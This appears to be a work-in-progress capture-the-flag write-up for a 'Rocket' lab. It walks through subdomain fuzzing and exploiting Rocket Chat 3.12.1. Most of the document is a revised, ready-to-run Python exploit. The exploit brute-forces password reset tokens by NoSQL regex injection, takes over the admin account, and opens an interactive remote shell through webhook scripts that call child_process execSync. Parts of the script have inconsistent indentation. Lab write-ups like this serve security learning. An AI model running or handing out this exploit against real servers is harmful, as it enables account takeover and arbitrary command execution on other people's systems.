# WIP: Rocket 

*Get ready for blast off!*

This room was a *quest*, many steps each a bit of effort. 

Scans revealed 22 and 80, on 80 you were redirected to 'rocket.thm', which a host entry needed to be created for.

There was just a brochureware site at that address, so with ffuf and scanning for subdomains (via `-H "Host: FUZZ.rocket.thm"`) the subdomain chat was found.

On chat.rocket.thm was, obviously, an instance of the Rocket Chat chat system. There is a few CVEs for this - the one I tried was https://www.exploit-db.com/exploits/49960, an exploit that can, with the email of an existing user and a target admin email account, reset passwords for these accounts via nosql injection to recover reset tokens, and then use the admin account to gain RCE via webhooks (the rocket chat webhook feature allows nodejs scripts).

The exploit by itself didn't work properly however - it could successfully reset passwords (changing them to `P@$$w0rd!1234`) but would fail when attempting to run the RCE. Examining the script, there were a few issues:

- first, resetting a password takes ages and it does this *twice*, once with the low priv user. This can be skipped by registering a user on the site then baking that user's password into the exploit and skipping the reset step. Though this might be unnecessary as its only purpose seems to be to get a OTP token.
- as just alluded to, the script assumes the site and the admin is protected by MFA. This is not the case for this room. Accordingly all the secret and code stuff in the script can be removed, but importantly, within the RCE function, the payload sent to the auth endpoint should be changed from:

  ```
  payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
  ```
  
  to
  
  ```
  payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
  ```
- third, the rce execution doesn't work because it uses the wrong format for the nodejs script, compared to what rocketchat expects. specifically it tries to create an integration (webhook) with the following script:

  ```
  const require = console.log.constructor('return process.mainModule.require')();
  const { exec } = require('child_process');
  exec('+cmd+');
  ```
  
  this however is invalid. at this point I abandoned the exploit and using the reset admin credentials, modded the integration directly to follow this format:
  
  ```
  class Script
  {
    process_incoming_request() {
      const require = console.log.constructor('return process.mainModule.require')();
      const { execSync } = require('child_process');
      res = execSync('chmod +x /tmp/CR86Ge29yShsPuLFp && /tmp/CR86Ge29yShsPuLFp');
      return { error: { success: true, message: res.toString() } }
    }
  }
  ```
  this also changed some of the offsets used to find the token and id from the response
- finally, reading the output needed to be tweaked: since the result was in a message field, parsing the response as json then printing this field would get proper formatting.
  
Webhooks can be invoked by curl, and the full curl command is helpfully provided on the integrations page. Notably, in the above setup the output of the command is placed in the general chat channel, which isn't very stealthy. Alternatively using `return { error: { success: false, message: res.toString() } }` would output the error on the command line after curl. Also, bad failures of the script can be diagnosed in the logs (though the log will be full of errors from the token brute forcing, be warned).

With RCE, the box was enumerated slowly. Its a tied down docker container, with none of the common tools. To upload I changed rocket chats settings to use the file system and /tmp folder, and then uploaded files into chat. They would be placed in /tmp with random file names, but were otherwise fine.

## Revised RocketChat Exploit

This is a modification of the exploit-db script. It should just require an admin email address (admin@rocket.thm) and a target (http://chat.rocket.thm)

```
#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import argparse
import sys

parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
parser.add_argument('-a', help='Administrator email', default='admin@rocket.thm')
parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', default='http://chat.rocket.thm')
parser.add_argument('-p', help='Password to set (default is P@$$w0rd!1234)', default=b'P@$$w0rd!1234')
args = parser.parse_args()

adminmail = args.a
target = args.t
passToSet = args.p

def forgotpassword(email,url):
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
	print("[+] Password Reset Email Sent")

def resettoken(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	headers={'content-type': 'application/json'}
	token = ""

	num = list(range(0,10))
	string_ints = [str(int) for int in num]
	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints

	while len(token)!= 43:
		for c in characters:
			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
			time.sleep(0.5)
			if 'Meteor.Error' not in r.text:
				token += c
				print(f"Got: {token}")

	print(f"[+] Got token : {token}")
	return token

def changingpassword(url,token):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"'+str(passToSet)+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("[-] Wrong token")
	print("[+] Admin Password was changed !")
	
def auth(url):
	# Authenticating
	sha256pass = hashlib.sha256(passToSet).hexdigest()
	headers={'content-type': 'application/json'}
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		return False
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	return userid,token

def rce(url,userid,token,cmd):
	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"class Script { process_incoming_request() { const require = console.log.constructor(\'return process.mainModule.require\')(); const { execSync } = require(\'child_process\'); res = execSync(\''+cmd+'\'); return { error: { sucess: true, message: res.toString() } } } }","type":"webhook-incoming"}'
	cookies = {'rc_uid': userid,'rc_token': token}
        headers = {'X-User-Id': userid,'X-Auth-Token': token}
        r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = r.text
	data = data.split(',')
	token = data[14]
	token = token[9:57]
	_id = data[20]
	_id = _id[7:24]

	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token
	r = requests.get(u)
	res = json.loads(r.text)
        print(res["message"])

############################################################

authRes = auth(target)
if authRes == False:
	## Sending Reset mail
	print(f"[+] Resetting {adminmail} password")
	forgotpassword(adminmail,target)

	## Getting reset token
	token = resettoken(target)

	## Resetting Password
	changingpassword(target,token)
	
	print("[+] authenticating as admin")
	authRes = auth(target)
	if authRes == False:
		print("[-] failed to auth")
		sys.exit()

## Authenticating and triggering rce

while True:
	cmd = input("CMD:> ")
	try:
		rce(target,authRes[0],authRes[1],cmd)
	except:
		print("command failed")
```
